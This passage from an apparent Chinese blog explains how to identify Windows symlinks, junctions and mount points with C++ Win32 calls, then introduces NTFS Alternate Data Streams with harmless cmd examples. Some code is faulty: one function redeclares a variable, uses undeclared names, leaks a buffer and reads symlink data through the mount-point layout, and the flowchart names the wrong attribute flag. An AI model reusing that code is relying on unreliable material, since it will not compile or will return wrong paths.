API可能会因为软连接的重定向影响行为，详见<a href=\"https://learn.microsoft.com/en-us/windows/win32/fileio/symbolic-link-effects-on-file-systems-functions?redirectedfrom=MSDN\">Symbolic Link Effects on File Systems Functions</a></p>\n</blockquote>\n<p>因此，在遍历并处理目录中文件的时候，建议对<code>CreateFileW</code>传入<code>FILE_FLAG_OPEN_REPARSE_POINT</code>符号位来保证获得的句柄一定是Reparse Point文件本身的句柄。如果启动了重定向，获得的句柄可能是指向最终文件的句柄，而<code>GetFileInformationByHandle</code>获取的信息自然也是最终文件的信息，<code>handleFileInformation.dwFileAttributes</code>也是最终文件的<code>dwFileAttributes</code>，就不一定含有<code>FILE_ATTRIBUTE_REPARSE_POINT</code>，则无法再判断文件是否是符号链接了。同时，由于<code>dwFileAttributes</code>是最终重定向后文件的<code>dwFileAttributes</code>，当前路径对应文件是否是一个目录/文件也无从判断。所以，正常的文件处理流程应该是：</p>\n<ol>\n<li><code>CreateFileW</code>传入<code>FILE_FLAG_OPEN_REPARSE_POINT</code>符号位保证获得的句柄一定是Reparse Point文件本身</li>\n<li><code>GetFileInformationByHandle</code>获取<code>dwFileAttributes</code></li>\n<li>判断文件是否有<code>FILE_ATTRIBUTE_REPARSE_POINT</code>符号位</li>\n<li>进一步判断Reparse Point的类型，并决定是否重定向</li>\n</ol>\n<p>要处理Reparse Point类型的文件就需要判断他们是哪一种Reparse Point。由于Reparse Point机制实现了多种文件的重定向能力，所以每一种Reparse Point类型都对应一种DWORD类型的Reparse Tag。再<code>winnt.h</code>中有形如<code>IO_REPARSE_TAG_XXX</code>的常量定义：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IO_REPARSE_TAG_MOUNT_POINT              (0xA0000003L)       </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IO_REPARSE_TAG_HSM                      (0xC0000004L)       </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IO_REPARSE_TAG_HSM2                     (0x80000006L)       </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IO_REPARSE_TAG_SIS                      (0x80000007L)       </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IO_REPARSE_TAG_WIM                      (0x80000008L)    </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IO_REPARSE_TAG_SYMLINK                  (0xA000000CL) </span></span><br><span class=\"line\">...   </span><br></pre></td></tr></table></figure><br>本文只介绍其中两种：<code>IO_REPARSE_TAG_MOUNT_POINT</code>和<code>IO_REPARSE_TAG_SYMLINK</code>。从字面上看他们分别用于标记挂载点和符号链接。通过他们就可以判断部分Reparse Point文件的类型了。Windows要获取文件的Reparse Tag需要用<code>FindFirstFileW</code> API获取<code>WIN32_FIND_DATAW</code>结构体中的保留字段<code>dwReserved0</code>：（该方法只对<code>dwFileAttributes</code>含有<code>FILE_ATTRIBUTE_REPARSE_POINT</code>的文件有用）<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">ReparseTag</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring &amp;wPath)</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> DWORD DEFAULT_REPARSE_TAG = <span class=\"number\">0</span>;</span><br><span class=\"line\">    WIN32_FIND_DATAW findFileData&#123;&#125;;</span><br><span class=\"line\">    HANDLE fileHandle = ::<span class=\"built_in\">FindFirstFileW</span>(wPath.<span class=\"built_in\">c_str</span>(), &amp;findFileData);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fileHandle == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> DEFAULT_REPARSE_TAG;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ::<span class=\"built_in\">FindClose</span>(fileHandle);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> findFileData.dwReserved0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"判断软连接\"><a href=\"#判断软连接\" class=\"headerlink\" title=\"判断软连接\"></a>判断软连接</h3><p><strong>所有用<code>mklink</code>创建出的指向文件的符号链接和<code>mklink /D</code>创建出的指向目录的符号链接，这里统称Symbolic文件。只有它们的Reparse Tag等于<code>IO_REPARSE_TAG_SYMLINK</code>，而<code>mklink /J</code>创建出的目录链接，其Reparse Tag等于<code>IO_REPARSE_TAG_MOUNT_POINT</code></strong></p>\n<p>由于目录链接Reparse Tag表现为挂载点，所以判断文件是否是软连接不能只用Reparse Tag。<br>我们不妨先撇下判断软连接，转而寻求另一条道路：尝试获取软连接指向的目标路径，如果成功获得，就说明这是个软连接。</p>\n<p>获取软连接的目标路径是一个比较麻烦的事，查到现在也没查到什么适合的官方API，但是我翻到了<code>DeviceIoControl</code> API传入<code>FSCTL_GET_REPARSE_POINT</code>调用似乎可以查到Reparse Point的元数据。其结果存放在一个结构体<code>_REPARSE_DATA_BUFFER</code>中：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * These structure is used for Interal Windows API. </span></span><br><span class=\"line\"><span class=\"comment\"> * There&#x27;s no associated import library to define them, so developers must define them maunally</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/ns-ntifs-_reparse_data_buffer?redirectedfrom=MSDN */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">REPARSE_DATA_BUFFER</span> &#123;</span></span><br><span class=\"line\">    ULONG  ReparseTag;</span><br><span class=\"line\">    USHORT ReparseDataLength;</span><br><span class=\"line\">    USHORT Reserved;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">            USHORT SubstituteNameOffset;</span><br><span class=\"line\">            USHORT SubstituteNameLength;</span><br><span class=\"line\">            USHORT PrintNameOffset;</span><br><span class=\"line\">            USHORT PrintNameLength;</span><br><span class=\"line\">            ULONG  Flags;</span><br><span class=\"line\">            WCHAR  PathBuffer[<span class=\"number\">1</span>];</span><br><span class=\"line\">        &#125; SymbolicLinkReparseBuffer;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">            USHORT SubstituteNameOffset;</span><br><span class=\"line\">            USHORT SubstituteNameLength;</span><br><span class=\"line\">            USHORT PrintNameOffset;</span><br><span class=\"line\">            USHORT PrintNameLength;</span><br><span class=\"line\">            WCHAR  PathBuffer[<span class=\"number\">1</span>];</span><br><span class=\"line\">        &#125; MountPointReparseBuffer;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">            UCHAR DataBuffer[<span class=\"number\">1</span>];</span><br><span class=\"line\">        &#125; GenericReparseBuffer;</span><br><span class=\"line\">    &#125; DUMMYUNIONNAME;</span><br><span class=\"line\">&#125; REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;</span><br></pre></td></tr></table></figure><br>Win32 API文档只给出了结构体<a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/ns-ntifs-_reparse_data_buffer?redirectedfrom=MSD\">_REPARSE_DATA_BUFFER</a>的定义但无法再任何公开的官方头文件中引入这个结构体，因为它是一个Windows内部API用的结构体，需要我们手动在自己的代码中定义。接着就是用<code>FSCTL_GET_REPARSE_POINT</code>获得该结构体的内容：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * return pointer to REPARSE_DATA_BUFFER which store target info of file with reparse attribute,</span></span><br><span class=\"line\"><span class=\"comment\"> * need to free memory if return non-nullptr value</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> REPARSE_DATA_BUFFER* <span class=\"title\">GetReparseDataBufferW</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring&amp; wPath)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    REPARSE_DATA_BUFFER* pReparseBuffer = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    DWORD dwSize;</span><br><span class=\"line\">    <span class=\"comment\">/* Open the file for read */</span></span><br><span class=\"line\">    HANDLE hFile = ::<span class=\"built_in\">CreateFileW</span>(</span><br><span class=\"line\">        wPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">        GENERIC_READ,</span><br><span class=\"line\">        FILE_SHARE_READ,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        OPEN_EXISTING,</span><br><span class=\"line\">        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,</span><br><span class=\"line\">        <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/* failed */</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/* Allocated areas info */</span></span><br><span class=\"line\">    pReparseBuffer = (REPARSE_DATA_BUFFER*)::<span class=\"built_in\">malloc</span>(MAXIMUM_REPARSE_DATA_BUFFER_SIZE);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pReparseBuffer == <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/* malloc failed */</span></span><br><span class=\"line\">        ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> ret = ::<span class=\"built_in\">DeviceIoControl</span>(</span><br><span class=\"line\">        hFile,</span><br><span class=\"line\">        FSCTL_GET_REPARSE_POINT,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        pReparseBuffer,</span><br><span class=\"line\">        MAXIMUM_REPARSE_DATA_BUFFER_SIZE,</span><br><span class=\"line\">        &amp;dwSize,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!ret) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/* failed */</span></span><br><span class=\"line\">        ::<span class=\"built_in\">free</span>(pReparseBuffer);</span><br><span class=\"line\">        ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pReparseBuffer;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过<code>REPARSE_DATA_BUFFER</code>获取链接目标路径：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">std::optional&lt;std::wstring&gt; <span class=\"title\">SymlinkTargetPathW</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring&amp; m_wPath)</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    REPARSE_DATA_BUFFER* pReparseBuffer = <span class=\"built_in\">GetReparseDataBufferW</span>(m_wPath);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pReparseBuffer == <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/* failed */</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    REPARSE_DATA_BUFFER* pReparseBuffer = <span class=\"built_in\">GetReparseDataBufferW</span>(m_wPath);</span><br><span class=\"line\">    USHORT targetNameIndex = pReparseBuffer-&gt;MountPointReparseBuffer.SubstituteNameOffset / <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(WCHAR);</span><br><span class=\"line\">    USHORT targetNameLength = pReparseBuffer-&gt;MountPointReparseBuffer.SubstituteNameLength / <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(WCHAR);</span><br><span class=\"line\">    USHORT displayNameIndex = pReparseBuffer-&gt;MountPointReparseBuffer.PrintNameOffset / <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(WCHAR);</span><br><span class=\"line\">    USHORT displayNameLength = pReparseBuffer-&gt;MountPointReparseBuffer.PrintNameLength / <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(WCHAR);</span><br><span class=\"line\">    WCHAR* targetName = &amp;pReparseBuffer-&gt;MountPointReparseBuffer.PathBuffer[targetNameIndex];</span><br><span class=\"line\">    WCHAR* displayName = &amp;pReparseBuffer-&gt;MountPointReparseBuffer.PathBuffer[displayNameIndex];</span><br><span class=\"line\">    wTarget.<span class=\"built_in\">assign</span>(targetName, targetName + targetNameLength);</span><br><span class=\"line\">    wPrintName.<span class=\"built_in\">assign</span>(displayName, displayName + displayNameLength);</span><br><span class=\"line\">    ::<span class=\"built_in\">free</span>(pReparseBuffer);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::make_optional&lt;std::wstring&gt;(wPrintName);</span><br></pre></td></tr></table></figure><br>通过实验发现无论Reparse Tag是<code>IO_REPARSE_TAG_MOUNT_POINT</code>的<code>Junction</code>还是Reparse Tag是<code>IO_REPARSE_TAG_SYMLINK</code>的<code>Symbolic</code>都可以通过这种方式拿到。所以可以通过尝试用这种方法获取链接目标路径来判断是否是一个软连接。</p>\n<blockquote>\n<p>参考：</p>\n<ul>\n<li><a href=\"https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CommonUtils/ReparsePoint.cpp\">googleprojectzero/symboliclink-testing-tools</a></li>\n<li><a href=\"https://stackoverflow.com/questions/46383428/get-the-immediate-target-path-from-symlink-reparse-point\">Get the immediate target path from symlink/reparse point</a></li>\n<li><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-fsctl_get_reparse_point?redirectedfrom=MSDN\">FSCTL_GET_REPARSE_POINT IOCTL (winioctl.h)</a></li>\n</ul>\n</blockquote>\n<p>上述方法中我们获取的是软连接的立即指向路径、及存在级联重定向场景时下一个目标的路径。如果要获取最终指向的目标路径，可以在<code>CreateFileW</code>时候不传入<code>FILE_FLAG_OPEN_REPARSE_POINT</code>开启重定向，并用<code>GetFinalPathNameByHandle</code> API根据句柄拿到最终路径：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* return final path of reparse target */</span></span><br><span class=\"line\"><span class=\"function\">std::optional&lt;std::wstring&gt; <span class=\"title\">StatResult::FinalPathW</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    BY_HANDLE_FILE_INFORMATION handleFileInformation&#123;&#125;;</span><br><span class=\"line\">    HANDLE hFile = ::<span class=\"built_in\">CreateFileW</span>(</span><br><span class=\"line\">        m_wPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">        GENERIC_READ,</span><br><span class=\"line\">        FILE_SHARE_READ,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        OPEN_EXISTING,</span><br><span class=\"line\">        FILE_FLAG_BACKUP_SEMANTICS,</span><br><span class=\"line\">        <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    WCHAR wPathBuff[MAX_PATH] = <span class=\"string\">L&quot;&quot;</span>;</span><br><span class=\"line\">    DWORD length = ::<span class=\"built_in\">GetFinalPathNameByHandleW</span>(hFile, wPathBuff, MAX_PATH, FILE_NAME_NORMALIZED);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (length == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/* failed */</span></span><br><span class=\"line\">        ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (length &gt;= MAX_PATH) &#123;</span><br><span class=\"line\">        DWORD extendLength = length + <span class=\"number\">1</span>;</span><br><span class=\"line\">        WCHAR* wPathExtendBuff = <span class=\"keyword\">new</span> WCHAR[extendLength];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (::<span class=\"built_in\">GetFinalPathNameByHandleW</span>(hFile, wPathExtendBuff, extendLength, FILE_NAME_NORMALIZED) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">/* failed */</span></span><br><span class=\"line\">            <span class=\"keyword\">delete</span>[] wPathExtendBuff;</span><br><span class=\"line\">            ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">/* succeed */</span></span><br><span class=\"line\">        ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">        <span class=\"function\">std::wstring <span class=\"title\">wTargetPath</span><span class=\"params\">(wPathExtendBuff)</span></span>;</span><br><span class=\"line\">        <span class=\"keyword\">delete</span>[] wPathExtendBuff;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">NormalizeWin32PathW</span>(wTargetPath);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/* succeed */</span></span><br><span class=\"line\">    ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">    <span class=\"function\">std::wstring <span class=\"title\">wTargetPath</span><span class=\"params\">(wPathBuff)</span></span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">NormalizeWin32PathW</span>(wTargetPath);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"判断挂载点\"><a href=\"#判断挂载点\" class=\"headerlink\" title=\"判断挂载点\"></a>判断挂载点</h3><p>对于挂载点，它的Reparse Tag一定是<code>IO_REPARSE_TAG_MOUNT_POINT</code>，但是由于对于该Reparse Tag的还可能是目录链接Junction，则可以通过尝试获取路径对于的挂载设备名来判断该路径是不是一个挂载点。获取挂载点设备名可以用<code>GetVolumeNameForVolumeMountPointW</code> API，它接受一个<code>\\</code>结尾的目录路径，返回对应的设备名。如果执行成功则返回TRUE，说吗这是个挂载点。<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * If this sparse point has IO_REPARSE_TAG_MOUNT_POINT tag, it maybe a device mount point or a junction link</span></span><br><span class=\"line\"><span class=\"comment\"> * if it&#x27;s device   point, GetVolumeNameForVolumeMountPointW can accquire device name</span></span><br><span class=\"line\"><span class=\"comment\"> * if it&#x27;s junction link, GetVolumeNameForVolumeMountPointW will return false</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\">std::optional&lt;std::wstring&gt; <span class=\"title\">MountedDeviceNameW</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring&amp; wPath)</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    WCHAR deviceNameBuff[MAX_PATH] = <span class=\"string\">L&quot;&quot;</span>;</span><br><span class=\"line\">    std::wstring wCanonicalPath = <span class=\"built_in\">CanonicalPathW</span>();</span><br><span class=\"line\">    <span class=\"comment\">/* GetVolumeNameForVolumeMountPointW require input path to end with backslash */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (wCanonicalPath.<span class=\"built_in\">back</span>() != <span class=\"string\">L&#x27;\\\\&#x27;</span>) &#123;</span><br><span class=\"line\">        wCanonicalPath.<span class=\"built_in\">push_back</span>(<span class=\"string\">L&#x27;\\\\&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (::<span class=\"built_in\">GetVolumeNameForVolumeMountPointW</span>(wCanonicalPath.<span class=\"built_in\">c_str</span>(), deviceNameBuff, MAX_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::make_optional&lt;std::wstring&gt;(deviceNameBuff);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如果路径是一个挂载点，则它一定不是一个软连接。如果是路径IO_REPARSE_TAG_MOUNT_POINT</p>\n<pre class=\"mermaid\">flowchart TD\nOpen(输入文件) --> CreateFileW\nCreateFileW[CreateFileW传入<br>FILE_FLAG_OPEN_REPARSE_POINT禁用重定向] --> GetFileInformationByHandle\nGetFileInformationByHandle[GetFileInformationByHandle<br>获取dwFileAttributes] --> Query\nQuery{查询dwFileAttributes<br>是否有FILE_ATTRIBUTE_SPARSE_FILE<br>符号位}\nQuery --Y--> TagQuery\nQuery --N--> CommonFile(普通文件)\nTagQuery[查询Sparse Tag] --> CheckSymlinkTag\nCheckSymlinkTag{检查Sparse Tag<br>是否等于IO_REPARSE_TAG_SYMLINK} --Y--> Symbolic(符号链接)\nCheckSymlinkTag --N--> QuerySparseBuffer[查询_REPARSE_DATA_BUFFER<br>尝试获取链接目标信息]\nQuerySparseBuffer --> CheckQuerySparseBuffer{查询目标路径成功}\nCheckQuerySparseBuffer --Y--> Junction(目录链接)\nCheckQuerySparseBuffer --N--> CheckQueryMount{查询挂载点信息成功}\nCheckQueryMount --Y--> MountPoint(挂载点)\nCheckQueryMount --N--> Known(未知Reparse类型)</pre>","tags":["Windows"]},{"title":"Windows文件系统概述(三)ADS","url":"/2023/03/19/Windows%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F3/","content":"<p>Alternative Data Streams (ADS)是Windows文件系统中引入的一项功能，可以为文件关联额外的数据流。这项功能的诞生原因是为了提高文件系统的兼容性和功能性，特别是与Macintosh和Unix系统创建的文件进行交互时。</p>\n<p>在Macintosh和Unix系统中，文件可以具有多个数据流，而Windows文件系统中最初只支持一个数据流。为了使Windows文件系统与其他操作系统更兼容，Microsoft引入了ADS功能，使Windows文件系统能够处理多个数据流。这项功能可以用于存储文件的元数据，如作者、创建日期、修改日期等，还可以用于存储图像和音频文件的缩略图、元数据等。</p>\n<p>ADS功能可以提供重要的功能和灵活性，但也带来了一些安全风险。因为ADS可以隐藏在文件中，不容易被普通的文件系统API或一些防病毒软件所发现，因此，它也可能被恶意软件利用来隐藏其存在，使得系统的安全受到威胁。</p>\n<p>尽管如此，ADS仍然被保留在Windows文件系统中，因为它在某些应用程序和使用情况下提供了重要的功能。但是，用户和组织需要意识到ADS所带来的安全风险，并采取措施来减轻这些风险，例如使用专门设计用于检测ADS中隐藏的恶意软件的防病毒软件等。本文将介绍ADS的创建和检测，以及如何用Win32 API读写ADS。</p>\n<span id=\"more\"></span>\n<h3 id=\"创建ADS\"><a href=\"#创建ADS\" class=\"headerlink\" title=\"创建ADS\"></a>创建ADS</h3><p>NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流。通俗的理解，就是其它文件可以“寄宿”在某个文件身上。</p>\n<p>首先来看个例子，打开<code>cmd.exe</code>，在<code>C:\\Test\\ADS</code>下创建一个<code>hello.txt</code>文件<br><figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span>&gt;<span class=\"title\">ECHO</span> <span class=\"title\">HelloWorld</span> &gt; <span class=\"title\">hello.txt</span></span></span><br></pre></td></tr></table></figure><br>用<code>DIR</code>可以看到该目录下已经有一个<code>hello.txt</code>文件，可以用<code>notepad.exe hello.txt</code>查看其内容，会发现”HelloWorld”已经被写入。</p>\n<p>接着继续指向如下命令：<br><figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span>&gt;<span class=\"title\">echo</span> <span class=\"title\">ThisIsADS1</span> &gt; <span class=\"title\">hello.txt:ads1</span>.<span class=\"title\">txt</span></span></span><br></pre></td></tr></table></figure><br>这条命令在<code>cmd.exe</code>下可以执行成功，看起来是向<code>hello.txt:ads1.txt</code>这个文件写入了”ThisIsADS1”的内容，但是此时用<code>DIR</code>列出该目录下所有文件，会发现依然只有<code>hello.txt</code>：</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span>&gt;<span class=\"title\">DIR</span></span></span><br><span class=\"line\"><span class=\"function\"> 驱动器 <span class=\"title\">C</span> 中的卷是 <span class=\"title\">Windows</span></span></span><br><span class=\"line\"><span class=\"function\"> 卷的序列号是 <span class=\"title\">CC7A</span>-4265</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"> <span class=\"title\">C</span>:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span> 的目录</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">2023/03/28  21:42    &lt;<span class=\"title\">DIR</span>&gt;          .</span></span><br><span class=\"line\"><span class=\"function\">2023/03/07  22:47    &lt;<span class=\"title\">DIR</span>&gt;          ..</span></span><br><span class=\"line\"><span class=\"function\">2023/03/28  21:44                26 <span class=\"title\">hello.txt</span></span></span><br><span class=\"line\"><span class=\"function\">               1 个文件             26 字节</span></span><br><span class=\"line\"><span class=\"function\">               2 个目录 67,740,217,344 可用字节</span></span><br></pre></td></tr></table></figure>\n<p>如果用<code>notepad.exe hello.txt</code>打开<code>hello.txt</code>会发现内容依然是”HelloWorld”，而用<code>notepad.exe hello.txt:ads1.txt</code>打开<code>hello.txt:ads1.txt</code>文件则会发现”ThisIsADS1”这个内容已经被成功写入了，如果删除<code>hello.txt</code>则<code>hello.txt:ads.txt</code>也无法打开。如果直接<code>echo ThisIsADS1 &gt; hello.txt:ads1.txt</code>创建<code>hello.txt:ads1.txt</code>则实际上会创建一个空的<code>hello.txt</code>文件。以上这些现象说明<code>hello.txt:ads1.txt</code>在当前文件系统是真实存在的而又不可见，看似就是依附于<code>hello.txt</code>的子文件。</p>\n<p><code>hello.txt:ads.txt</code>这类文件就是<strong>指定了宿主的ADS文件</strong>，<code>hello.txt</code>就是它的宿主。<strong>宿主的删除会导致依附的ADS文件也被删除</strong></p>\n<p>要查看目录下的ADS文件可以用<code>DIR /R</code><br><figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span>&gt;<span class=\"title\">DIR</span> /<span class=\"title\">R</span></span></span><br><span class=\"line\"><span class=\"function\"> 驱动器 <span class=\"title\">C</span> 中的卷是 <span class=\"title\">Windows</span></span></span><br><span class=\"line\"><span class=\"function\"> 卷的序列号是 <span class=\"title\">CC7A</span>-4265</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"> <span class=\"title\">C</span>:\\<span class=\"title\">Test</span>\\<span class=\"title\">ADS</span> 的目录</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">2023/03/28  21:55    &lt;<span class=\"title\">DIR</span>&gt;          .</span></span><br><span class=\"line\"><span class=\"function\">2023/03/07  22:47    &lt;<span class=\"title\">DIR</span>&gt;          ..</span></span><br><span class=\"line\"><span class=\"function\">2023/03/28  21:55                 0 <span class=\"title\">hello.txt</span></span></span><br><span class=\"line\"><span class=\"function\">                                 26 <span class=\"title\">hello.txt:ads1</span>.<span class=\"title\">txt</span>:$<span class=\"title\">DATA</span></span></span><br><span class=\"line\"><span class=\"function\">               1 个文件              0 字节</span></span><br><span class=\"line\"><span class=\"function\">               2 个目录 67,761,876,992 可用字节</span></span><br></pre></td></tr></table></figure><br>可以看见<code>hello.txt</code>有时间信息，而<code>hello.txt:ads.txt</code>并没有。这是因为<strong>ADS文件和宿主共享相同的文件元数据</strong>。ADS文件的大小也不会反应在宿主文件的大小上，宿主文件的大小属性只描述其自身数据的大小。</p>\n<p>ADS文件不仅可以依附于文件，也可以依附于目录。创建依附目录的ADS文件同理：<br><figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\<span class=\"title\">Test</span>\\<span 